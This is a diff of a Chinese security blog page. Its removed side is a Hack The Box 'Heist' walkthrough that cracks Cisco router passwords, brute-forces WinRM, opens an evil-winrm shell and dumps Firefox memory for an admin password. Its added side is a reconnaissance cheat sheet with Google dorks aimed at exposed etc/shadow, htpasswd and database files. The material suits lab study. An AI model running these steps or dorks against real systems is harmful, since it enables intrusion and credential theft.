@@ -4,10 +4,10 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="HTB(Hack The Box)系列—Heist, dylan&#39;s blog">
-    <meta name="description" content="0x00 前言今天挑战的靶机是Hack The Box的“Heist”，10.10.10.149
-0x01 信息收集使用masscan进行全端口扫描
-masscan -p 1-65535,U:1-65535 -e tun0 10.10.10">
+    <meta name="keywords" content="学习总结篇—信息收集, dylan&#39;s blog">
+    <meta name="description" content="0x00 前言目标资产信息搜集的程度，决定渗透过程的复杂程度。目标主机信息搜集的深度，决定后渗透权限持续把控。
+渗透的本质是信息搜集，而信息搜集整理为后续的情报跟进提供了强有力的保证。
+0x01 分类被动信息收集被动信息收集：利用第三方的服">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -15,7 +15,7 @@ masscan -p 1-65535,U:1-65535 -e tun0 10.10.10">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>HTB(Hack The Box)系列—Heist | dylan&#39;s blog</title>
+    <title>学习总结篇—信息收集 | dylan&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -262,7 +262,7 @@ masscan -p 1-65535,U:1-65535 -e tun0 10.10.10">
 <script src="/libs/cryptojs/crypto-js.min.js"></script>
 <script>
     (function() {
-        let pwd = '';
+        let pwd = '9f77c4517ffa5375fb7f06c0209facae53fd5e4b7b88986eb0c11591810b2dbe';
         if (pwd && pwd.length > 0) {
             if (pwd !== CryptoJS.SHA256(prompt('Being their worst nightmare！')).toString(CryptoJS.enc.Hex)) {
                 alert('Error！');
@@ -275,13 +275,13 @@ masscan -p 1-65535,U:1-65535 -e tun0 10.10.10">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        HTB(Hack The Box)系列—Heist
+                        学习总结篇—信息收集
                     </div>
                 </div>
             </div>
@@ -392,16 +392,12 @@ masscan -p 1-65535,U:1-65535 -e tun0 10.10.10">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/HTB/" target="_blank">
-                                <span class="chip bg-color">HTB</span>
+                            <a href="/tags/summary/" target="_blank">
+                                <span class="chip bg-color">summary</span>
                             </a>
                         
-                            <a href="/tags/Hack-The-Box/" target="_blank">
-                                <span class="chip bg-color">Hack The Box</span>
-                            </a>
-                        
-                            <a href="/tags/靶场/" target="_blank">
-                                <span class="chip bg-color">靶场</span>
+                            <a href="/tags/信息收集/" target="_blank">
+                                <span class="chip bg-color">信息收集</span>
                             </a>
                         
                     </div>
@@ -412,8 +408,8 @@ masscan -p 1-65535,U:1-65535 -e tun0 10.10.10">
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/HTB系列/" class="post-category" target="_blank">
-                                HTB系列
+                            <a href="/categories/summary/" class="post-category" target="_blank">
+                                summary
                             </a>
                         
                     </div>
@@ -424,21 +420,21 @@ masscan -p 1-65535,U:1-65535 -e tun0 10.10.10">
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-12-02
+                    2019-08-23
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1k
+                        2.4k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        4 分
+                        10 分
                     </div>
                     
                 
@@ -454,107 +450,237 @@ masscan -p 1-65535,U:1-65535 -e tun0 10.10.10">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天挑战的靶机是Hack The Box的“Heist”，<code>10.10.10.149</code></p>
-<h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><p>使用<code>masscan</code>进行全端口扫描</p>
-<p><code>masscan -p 1-65535,U:1-65535 -e tun0 10.10.10.149 --rate=1000</code></p>
-<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191202160154.png" alt></p>
-<p>使用<code>nmap</code>查看端口详细信息</p>
-<p><code>nmap -A -p 80,135,445,5985,49669 10.10.10.149</code></p>
-<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191202161302.png" alt></p>
-<p>尝试连接<code>smb</code>，发现需要密码</p>
-<p><code>smbclient --list 10.10.10.149 -U &quot;&quot;</code></p>
-<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191202163244.png" alt></p>
-<p>浏览器访问80端口，需要登陆，可以以游客身份登陆</p>
-<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191202163737.png" alt></p>
-<p>一个叫<code>Hazard</code>的用户提交了一个<code>issue</code>，是关于他的思科路由器的问题，<br>并且发出了他的配置文件</p>
-<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191202164032.png" alt></p>
-<p>打开配置文件找到了一些用户名和密码</p>
-<h1 id="0x02-爆破密码"><a href="#0x02-爆破密码" class="headerlink" title="0x02 爆破密码"></a>0x02 爆破密码</h1><p>一般来说，思科设备的密码会以两种形式保存在IOS配置文件中，<br>一种是思科的<code>Type 7</code>加密形式，一种是<code>Type 5</code>加密形式。<br>前者是思科自己的加密形式，存在多年，但是这种加密方式很简单，是可以进行破解的。<br>后者相当于MD5加密，是无法被破解的（除非是弱密码，能通过字典进行暴力破解）。</p>
-<p><code>[...] enable password 7 046E1803362E595C260E0B240619050A2D</code><br><code>[...] username &#39;user&#39; password 7 046E1803362E595C260E0B240619050A2D</code></p>
-<p>这样类似的语句是思科的<code>Type 7</code>加密形式</p>
-<p><code>[...] enable secret 5 $1$SpMm$eALjeyED.WSZs0naLNv22/</code><br><code>[...] username ‘user’ secret 5 $1$SpMm$eALjeyED.WSZs0naLNv22/</code></p>
-<p>这样类似的语句是思科的<code>Type 5</code>加密形式</p>
-<pre><code>version 12.2
-no service pad
-service password-encryption
-!
-isdn switch-type basic-5ess
-!
-hostname ios-1
-!
-security passwords min-length 12
-enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
-!
-username rout3r password 7 0242114B0E143F015F5D1E161713
-username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
-!
-!
-ip ssh authentication-retries 5
-ip ssh version 2
-!
-!
-router bgp 100
- synchronization
- bgp log-neighbor-changes
- bgp dampening
- network 192.168.0.0 mask 300.255.255.0
- timers bgp 3 9
- redistribute connected
-!
-ip classless
-ip route 0.0.0.0 0.0.0.0 192.168.0.1
-!
-!
-access-list 101 permit ip any any
-dialer-list 1 protocol ip list 101
-!
-no ip http server
-no ip http secure-server
-!
-line vty 0 4
- session-timeout 600
- authorization exec SSH
- transport input ssh</code></pre><p>这里给出两个在线解密网址<br><a href="http://www.ifm.net.nz/cookbooks/passwordcracker.html" target="_blank" rel="noopener">http://www.ifm.net.nz/cookbooks/passwordcracker.html</a><br><a href="https://www.xiaopeiqing.com/cisco-password-cracker/" target="_blank" rel="noopener">https://www.xiaopeiqing.com/cisco-password-cracker/</a></p>
-<p><code>Type 7</code>加密形式直接解密即可</p>
-<p><code>0242114B0E143F015F5D1E161713</code>             —&gt;    <code>$uperP@ssword</code><br><code>02375012182C1A1D751618034F36415408</code>  —&gt;    <code>Q4)sJu\Y8qz*A3?d</code></p>
-<p><code>Type 5</code>加密形式这里使用<code>john</code>来破解<br>破解过的密码会存储在home目录下的隐藏文件<code>.john/john.pot</code>中</p>
-<p>将<code>$1$pdQG$o8nrSzsGXeaduXrjlvKc91</code>添加到文本文件。<br>使用Kali自带的<code>rockyou.txt</code>字典（常用的弱口令大全）来破解</p>
-<p><code>$1$pdQG$o8nrSzsGXeaduXrjlvKc91</code>          —&gt;    <code>stealth1agent</code></p>
-<p>如果第一次使用请解压：</p>
-<p><code>gzip -d /usr/share/wordlists/rockyou.txt.gz</code></p>
-<pre><code>vim hash.txt
-john --wordlist=/usr/share/wordlists/rockyou.txt ./hash.txt 
-john --show ./hash.txt </code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203141941.png" alt></p>
-<h1 id="0x03-SMB"><a href="#0x03-SMB" class="headerlink" title="0x03 SMB"></a>0x03 SMB</h1><p>猜测上面提交<code>issue</code>的用户<code>hazard</code>存在<br>尝试使用用户名:<code>hazard</code>  密码： <code>stealth1agent</code> 连接smb<br>成功连接，但是没有什么发现</p>
-<p><code>smbclient --list 10.10.10.149 -U &quot;hazard&quot;</code></p>
-<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203144754.png" alt></p>
-<h1 id="0x04-枚举用户"><a href="#0x04-枚举用户" class="headerlink" title="0x04 枚举用户"></a>0x04 枚举用户</h1><p>然后尝试使用<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py" target="_blank" rel="noopener">lookupsid.py</a>脚本来枚举其它用户</p>
-<pre><code>wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/lookupsid.py
-python lookupsid.py hazard:stealth1agent@10.10.10.149</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203162833.png" alt></p>
-<h1 id="0x05-爆破Winrm"><a href="#0x05-爆破Winrm" class="headerlink" title="0x05 爆破Winrm"></a>0x05 爆破Winrm</h1><p>目标机上开放了winrm 5985端口<br>将解密出来的密码和用户名添加到txt文件<br>使用metasploit来尝试爆破密码</p>
-<pre><code>use auxiliary/scanner/winrm/winrm_login
-set pass_file /root/HTB/Heist/password.txt
-set user_file /root/HTB/Heist/user.txt
-set rhosts 10.10.10.149
-run</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203174209.png" alt></p>
-<p>成功跑出来一个<br><code>chase:Q4)sJu\Y8qz*A3?d</code><br>使用<a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener">evil-winrm</a>工具获取shell<br>得到<code>user.txt</code></p>
-<pre><code>gem install evil-winrm     // 安装evil-winrm
-evil-winrm -i 10.10.10.149 -u chase -p &#39;Q4)sJu\Y8qz*A3?d&#39;</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203163853.png" alt></p>
-<h1 id="0x06-dump进程"><a href="#0x06-dump进程" class="headerlink" title="0x06 dump进程"></a>0x06 dump进程</h1><p>然后找了一圈，没发现其它的东西<br>查看进程，发现有几个<code>Firefox</code>进程</p>
-<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203183945.png" alt></p>
-<p>然后尝试上传<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank" rel="noopener">ProcDump</a>工具</p>
-<p><code>upload /root/HTB/Heist/procdump64.exe</code></p>
-<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203184357.png" alt></p>
-<p><code>./procdump64.exe -mp 6176    // 6176为进程ID号</code></p>
-<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203204506.png" alt></p>
-<p>再上传<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/strings" target="_blank" rel="noopener">Strings</a></p>
-<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203205249.png" alt></p>
-<p>使用<code>strings</code>工具读取<code>dmp</code>文件，并保存结果为<code>txt</code><br>查找<code>txt</code>文件发现该浏览器不断请求这个url 并且是明文密码传输</p>
-<pre><code>cmd /c &quot;strings64.exe -accepteula firefox.exe_191203_172802.dmp &gt; firefox.exe_191203_172802.txt&quot;
-findstr &quot;password&quot; ./firefox.exe_191203_172802.txt</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203204836.png" alt></p>
-<h1 id="0x07-登陆admin"><a href="#0x07-登陆admin" class="headerlink" title="0x07 登陆admin"></a>0x07 登陆admin</h1><p>尝试用链接中的密码<code>4dD!5}x/re8]FBuZ</code>登陆<code>Administrator</code><br>成功登陆获取<code>root.txt</code></p>
-<p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203210511.png" alt></p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.freebuf.com/sectool/210479.html" target="_blank" rel="noopener">evil-winrm：Windows远程管理（WinRM）Shell终极版</a><br><a href="https://0xrick.github.io/hack-the-box/heist/" target="_blank" rel="noopener">Hack The Box - Heist | 0xRick</a><br><a href="https://infosec.rm-it.de/" target="_blank" rel="noopener">infosec.rm-it.de</a><br><a href="https://www.freebuf.com/sectool/184573.html" target="_blank" rel="noopener">CrackMapExec：一款针对大型Windows活动目录(AD)的后渗透工具</a></p>
+                <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>目标资产信息搜集的程度，决定渗透过程的复杂程度。<br>目标主机信息搜集的深度，决定后渗透权限持续把控。</p>
+<p>渗透的本质是信息搜集，而信息搜集整理为后续的情报跟进提供了强有力的保证。</p>
+<h1 id="0x01-分类"><a href="#0x01-分类" class="headerlink" title="0x01 分类"></a>0x01 分类</h1><h2 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h2><p>被动信息收集：利用第三方的服务对目标进行访问了解，<br>比如whois查询、Google搜索、Shodan搜索等等</p>
+<h2 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h2><p>主动信息收集：通过直接访问、扫描网站，这种流量将流经网站</p>
+<h1 id="0x02-收集方向"><a href="#0x02-收集方向" class="headerlink" title="0x02 收集方向"></a>0x02 收集方向</h1><h2 id="一、whois查询"><a href="#一、whois查询" class="headerlink" title="一、whois查询"></a>一、whois查询</h2><p>可用信息：邮箱地址，注册人，作者信息</p>
+<ul>
+<li><a href="https://whois.aliyun.com/" target="_blank" rel="noopener">https://whois.aliyun.com/</a>  //阿里</li>
+<li><a href="https://www.whois365.com/cn/" target="_blank" rel="noopener">https://www.whois365.com/cn/</a>  //全球查</li>
+<li><a href="http://ipwhois.cnnic.net.cn/" target="_blank" rel="noopener">http://ipwhois.cnnic.net.cn/</a>  //中国互联网信息中心</li>
+<li><a href="http://whois.domaintools.com/" target="_blank" rel="noopener">http://whois.domaintools.com/</a>  //Whois Lookup, Domain Availability &amp; IP Search - DomainTools</li>
+<li><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a>  //站长</li>
+<li><a href="https://x.threatbook.cn/%20" target="_blank" rel="noopener">https://x.threatbook.cn/ </a>  //微步</li>
+<li><a href="http://whois.aizhan.com" target="_blank" rel="noopener">http://whois.aizhan.com</a>  //爱站</li>
+<li>kali命令:  <code>whois www.xxx.com</code></li>
+</ul>
+<h2 id="二、备案查询"><a href="#二、备案查询" class="headerlink" title="二、备案查询"></a>二、备案查询</h2><p>注册人姓名</p>
+<ul>
+<li><a href="http://tianyancha.com" target="_blank" rel="noopener">http://tianyancha.com</a>  //天眼查</li>
+<li><a href="http://www.beianbeian.com/" target="_blank" rel="noopener">http://www.beianbeian.com/</a>  //ICP备案查询网</li>
+<li><a href="http://beian.miit.gov.cn" target="_blank" rel="noopener">http://beian.miit.gov.cn</a>   //工信部</li>
+<li><a href="http://www.gsxt.gov.cn/index.html" target="_blank" rel="noopener">http://www.gsxt.gov.cn/index.html</a>    //国家企业信用信息公示系统</li>
+</ul>
+<h2 id="三、端口"><a href="#三、端口" class="headerlink" title="三、端口"></a>三、端口</h2><h3 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h3><ul>
+<li><a href="http://tool.chinaz.com/port" target="_blank" rel="noopener">http://tool.chinaz.com/port</a></li>
+<li><a href="http://www.shungg.cn/sm/" target="_blank" rel="noopener">http://www.shungg.cn/sm/</a></li>
+<li><a href="http://coolaf.com/tool/port" target="_blank" rel="noopener">http://coolaf.com/tool/port</a></li>
+<li><a href="https://tool.lu/portscan/" target="_blank" rel="noopener">https://tool.lu/portscan/</a></li>
+<li><a href="http://tool.cc/port/" target="_blank" rel="noopener">http://tool.cc/port/</a></li>
+<li><a href="http://duankou.wlphp.com/" target="_blank" rel="noopener">http://duankou.wlphp.com/</a></li>
+<li><a href="https://www.astrill.com/zh/port-scan" target="_blank" rel="noopener">https://www.astrill.com/zh/port-scan</a></li>
+</ul>
+<h3 id="本地工具"><a href="#本地工具" class="headerlink" title="本地工具"></a>本地工具</h3><pre><code>nmap -A -v -T4   192.168.1.1  //查看开放端口
+masscan -p80 192.168.1.1/24 --rate=10000    //测试目标指定端口
+netstat -pantu    //测试kalikali本身开放端口</code></pre><h2 id="三、子域名"><a href="#三、子域名" class="headerlink" title="三、子域名"></a>三、子域名</h2><p>国外组织统计的最受欢迎子域名列表：<br><a href="https://github.com/bitquark/dnspop/tree/master/results" target="_blank" rel="noopener">https://github.com/bitquark/dnspop/tree/master/results</a></p>
+<h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><ul>
+<li>site:baidu.com</li>
+</ul>
+<h3 id="有许多第三方服务聚合了大量的DNS数据集，并通过它们来检索给定域名的子域名。"><a href="#有许多第三方服务聚合了大量的DNS数据集，并通过它们来检索给定域名的子域名。" class="headerlink" title="有许多第三方服务聚合了大量的DNS数据集，并通过它们来检索给定域名的子域名。"></a>有许多第三方服务聚合了大量的DNS数据集，并通过它们来检索给定域名的子域名。</h3><ul>
+<li><a href="https://viewdns.info/" target="_blank" rel="noopener">https://viewdns.info/</a></li>
+<li><a href="https://securitytrails.com/" target="_blank" rel="noopener">https://securitytrails.com/</a></li>
+<li><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a></li>
+<li><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></li>
+<li><a href="https://searchdns.netcraft.com/" target="_blank" rel="noopener">https://searchdns.netcraft.com/</a></li>
+<li><a href="https://x.threatbook.cn/en" target="_blank" rel="noopener">https://x.threatbook.cn/en</a></li>
+<li><a href="https://www.virustotal.com/gui/home/upload" target="_blank" rel="noopener">Virustotal</a>//输入”domain:target.com”,返回子域名列表和一些辅助信息。</li>
+</ul>
+<h3 id="基于SSL证书查询"><a href="#基于SSL证书查询" class="headerlink" title="基于SSL证书查询"></a>基于SSL证书查询</h3><ul>
+<li><a href="https://censys.io" target="_blank" rel="noopener">https://censys.io</a> </li>
+<li><a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a></li>
+<li><a href="https://developers.facebook.com/tools/ct/" target="_blank" rel="noopener">https://developers.facebook.com/tools/ct/</a></li>
+<li><a href="https://spyse.com/search/certificate" target="_blank" rel="noopener">https://spyse.com/search/certificate</a></li>
+<li><a href="https://google.com/transparencyreport/https/ct/" target="_blank" rel="noopener">https://google.com/transparencyreport/https/ct/</a></li>
+</ul>
+<h3 id="在线爆破"><a href="#在线爆破" class="headerlink" title="在线爆破"></a>在线爆破</h3><ul>
+<li><a href="http://tool.chinaz.com/subdomain" target="_blank" rel="noopener">http://tool.chinaz.com/subdomain</a>   //站长工具</li>
+<li><a href="https://phpinfo.me/domain" target="_blank" rel="noopener">https://phpinfo.me/domain</a>     //在线子域名爆破工具</li>
+<li><a href="http://z.zcjun.com/" target="_blank" rel="noopener">http://z.zcjun.com/</a>    //在线子域名爆破-子成君提供</li>
+<li><a href="https://dns.bufferover.run/dns?q=," target="_blank" rel="noopener">https://dns.bufferover.run/dns?q=,</a></li>
+</ul>
+<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul>
+<li><a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">OneForAll</a></li>
+<li><a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">wydomain</a></li>
+<li>Maltego</li>
+<li>Layer 子域名挖掘机</li>
+<li><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">subDomainsBrute</a> </li>
+<li><a href="https://github.com/FeeiCN/ESD" target="_blank" rel="noopener">ESD: Enumeration sub domains(枚举子域名)</a></li>
+<li>Nmap   //使用 –script dns-brute 脚本</li>
+</ul>
+<h2 id="四、旁站C段"><a href="#四、旁站C段" class="headerlink" title="四、旁站C段"></a>四、旁站C段</h2><h3 id="搜索引擎-1"><a href="#搜索引擎-1" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><p>利用google搜索C段服务器信息<br><code>site:218.87.21.*</code></p>
+<h3 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h3><ul>
+<li><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">https://phpinfo.me/bing.php</a>   //在线旁站|C段|必应接口C段|同ip网站 - phpinfo.me</li>
+<li><a href="http://www.114best.com/ip/" target="_blank" rel="noopener">http://www.114best.com/ip/</a></li>
+<li><a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a></li>
+</ul>
+<h2 id="五、指纹识别"><a href="#五、指纹识别" class="headerlink" title="五、指纹识别"></a>五、指纹识别</h2><h3 id="在线识别"><a href="#在线识别" class="headerlink" title="在线识别"></a>在线识别</h3><ul>
+<li><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a></li>
+<li><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a></li>
+</ul>
+<h3 id="本地工具-1"><a href="#本地工具-1" class="headerlink" title="本地工具"></a>本地工具</h3><ul>
+<li>御剑cms</li>
+<li>大禹cms</li>
+</ul>
+<h3 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h3><ul>
+<li>whatweb <a href="https://www.baidubaidu.com" target="_blank" rel="noopener">https://www.baidubaidu.com</a></li>
+</ul>
+<h3 id="cms漏洞利用"><a href="#cms漏洞利用" class="headerlink" title="cms漏洞利用"></a>cms漏洞利用</h3><ul>
+<li><a href="https://bugss.shuimugan.com" target="_blank" rel="noopener">https://bugss.shuimugan.com</a>     //乌云查找相关漏洞</li>
+</ul>
+<h2 id="六、敏感目录"><a href="#六、敏感目录" class="headerlink" title="六、敏感目录"></a>六、敏感目录</h2><h3 id="工具-1"><a href="#工具-1" class="headerlink" title="工具:"></a>工具:</h3><ul>
+<li>御剑后台扫描</li>
+<li>wwwscan</li>
+</ul>
+<h3 id="kali-1"><a href="#kali-1" class="headerlink" title="kali"></a>kali</h3><ul>
+<li><code>dirb http://www.baidu.com</code>      //命令工具</li>
+<li>dirbuster         //界面化工具</li>
+<li><code>wpscan -u http://www.baidu.comcom</code>  //kali扫描WordPress漏洞</li>
+</ul>
+<h2 id="七、敏感信息"><a href="#七、敏感信息" class="headerlink" title="七、敏感信息"></a>七、敏感信息</h2><h3 id="网络返回包"><a href="#网络返回包" class="headerlink" title="网络返回包"></a>网络返回包</h3><ul>
+<li>F12查看系统，php版本</li>
+</ul>
+<h3 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h3><ul>
+<li>site:Github password     //github上查找敏感信息</li>
+</ul>
+<h3 id="搜索引擎-2"><a href="#搜索引擎-2" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><h4 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h4><h5 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h5><ul>
+<li>site</li>
+<li>inurl</li>
+<li>intext</li>
+<li>filetype</li>
+<li>intitle</li>
+<li>link           //与<a href="http://www.xxx.com做了外链的网站" target="_blank" rel="noopener">www.xxx.com做了外链的网站</a></li>
+<li>info      //搜索网页信息</li>
+<li>+　　把google可能忽略的字列如查询范围。</li>
+<li>-　　把某个字忽略，例子：新加 -坡。</li>
+<li>~　　同意词。</li>
+<li>.　　单一的通配符。</li>
+<li>*　　通配符，可代表多个字母。</li>
+<li>“”　　精确查询。</li>
+</ul>
+<h5 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h5><pre><code>site:xx.com intext:管理|后台|登录|用户名|密码|系统|账号
+site:xx.com inurl:login/
+admin/manage/manager/admin_login/system
+site:xx.com intitle:管理|后台|登录</code></pre><h5 id="搜索不同国家网站"><a href="#搜索不同国家网站" class="headerlink" title="搜索不同国家网站"></a>搜索不同国家网站</h5><ul>
+<li>inurl:tw　　台湾</li>
+<li>inurl:jp　　日本</li>
+</ul>
+<h5 id="暴库"><a href="#暴库" class="headerlink" title="暴库"></a>暴库</h5><pre><code>inurl:editor/db/ 
+inurl:eWebEditor/db/ 
+inurl:bbs/data/ 
+inurl:databackup/ 
+inurl:blog/data/ 
+inurl:\boke\data 
+inurl:bbs/database/ 
+inurl:conn.asp 
+inc/conn.asp
+Server.mapPath(“.mdb”)
+allinurl:bbs data
+filetype:mdb inurl:database
+filetype:inc conn
+inurl:data filetype:mdb
+intitle:&quot;index of&quot; data</code></pre><h5 id="搜索敏感信息"><a href="#搜索敏感信息" class="headerlink" title="搜索敏感信息"></a>搜索敏感信息</h5><pre><code>intitle:&quot;index of&quot; etc
+intitle:&quot;Index of&quot; .sh_history
+intitle:&quot;Index of&quot; .bash_history
+intitle:&quot;index of&quot; passwd
+intitle:&quot;index of&quot; people.lst
+intitle:&quot;index of&quot; pwd.db
+intitle:&quot;index of&quot; etc/shadow
+intitle:&quot;index of&quot; spwd
+intitle:&quot;index of&quot; master.passwd
+intitle:&quot;index of&quot; htpasswd
+inurl:service.pwd</code></pre><h4 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a>shodan</h4><p>shodan网络搜索引擎偏向网络设备以及服务器的搜索，具体内容可上网查阅，这里给出它的高级搜索语法。<br>地址：<a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></p>
+<h5 id="基本语法-1"><a href="#基本语法-1" class="headerlink" title="基本语法"></a>基本语法</h5><p>详见：<br><a href="https://xiaix.me/shodan-xin-shou-ru-keng-zhi-nan/" target="_blank" rel="noopener">Shodan 新手入坑指南</a></p>
+<pre><code>hostname：　　搜索指定的主机或域名，例如 hostname:”google”
+port：　　搜索指定的端口或服务，例如 port:”21”
+country：　　搜索指定的国家，例如 country:”CN”
+city：　　搜索指定的城市，例如 city:”Hefei”
+org：　　搜索指定的组织或公司，例如 org:”google”
+isp：　　搜索指定的ISP供应商，例如 isp:”China Telecom”
+product：　　搜索指定的操作系统/软件/平台，例如 product:”Apache httpd”
+version：　　搜索指定的软件版本，例如 version:”1.6.2”
+geo：　　搜索指定的地理位置，例如 geo:”31.8639, 117.2808”
+before/after：　　搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:”11-11-15”
+net：　　搜索指定的IP地址或子网，例如 net:”210.45.240.0/24”</code></pre><h4 id="钟馗之眼-ZoomEye"><a href="#钟馗之眼-ZoomEye" class="headerlink" title="钟馗之眼(ZoomEye)"></a>钟馗之眼(ZoomEye)</h4><p>钟馗之眼(ZoomEye)搜索引擎偏向web应用层面的搜索。<br>地址：<a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a></p>
+<pre><code>app:nginx　　组件名
+ver:1.0　　版本
+os:windows　　操作系统
+country:”China”　　国家
+city:”hangzhou”　　城市
+port:80　　端口
+hostname:google　　主机名
+site:thief.one　　网站域名
+desc:nmask　　描述
+keywords:nmask’blog　　关键词
+service:ftp　　服务类型
+ip:8.8.8.8　　ip地址
+cidr:8.8.8.8/24　　ip地址段</code></pre><h4 id="FoFa搜索引擎"><a href="#FoFa搜索引擎" class="headerlink" title="FoFa搜索引擎"></a>FoFa搜索引擎</h4><p>FoFa搜索引擎偏向资产搜索。<br>地址：<a href="https://fofa.so" target="_blank" rel="noopener">https://fofa.so</a></p>
+<h5 id="基本语法-2"><a href="#基本语法-2" class="headerlink" title="基本语法"></a>基本语法</h5><pre><code>title=”abc” 从标题中搜索abc。例：标题中有北京的网站。
+header=”abc” 从http头中搜索abc。例：jboss服务器。
+body=”abc” 从html正文中搜索abc。例：正文包含Hacked by。
+domain=”qq.com” 搜索根域名带有qq.com的网站。例： 根域名是qq.com的网站。
+host=”.gov.cn” 从url中搜索.gov.cn,注意搜索要用host作为名称。
+port=”443” 查找对应443端口的资产。例： 查找对应443端口的资产。
+ip=”1.1.1.1” 从ip中搜索包含1.1.1.1的网站,注意搜索要用ip作为名称。
+protocol=”https” 搜索制定协议类型(在开启端口扫描的情况下有效)。例： 查询https协议资产。
+city=”Beijing” 搜索指定城市的资产。例： 搜索指定城市的资产。
+region=”Zhejiang” 搜索指定行政区的资产。例： 搜索指定行政区的资产。
+country=”CN” 搜索指定国家(编码)的资产。例： 搜索指定国家(编码)的资产。
+cert=”google.com” 搜索证书(https或者imaps等)中带有google.com的资产。</code></pre><h5 id="高级搜索"><a href="#高级搜索" class="headerlink" title="高级搜索"></a>高级搜索</h5><pre><code>title=”powered by” &amp;&amp; title!=discuz
+title!=”powered by” &amp;&amp; body=discuz
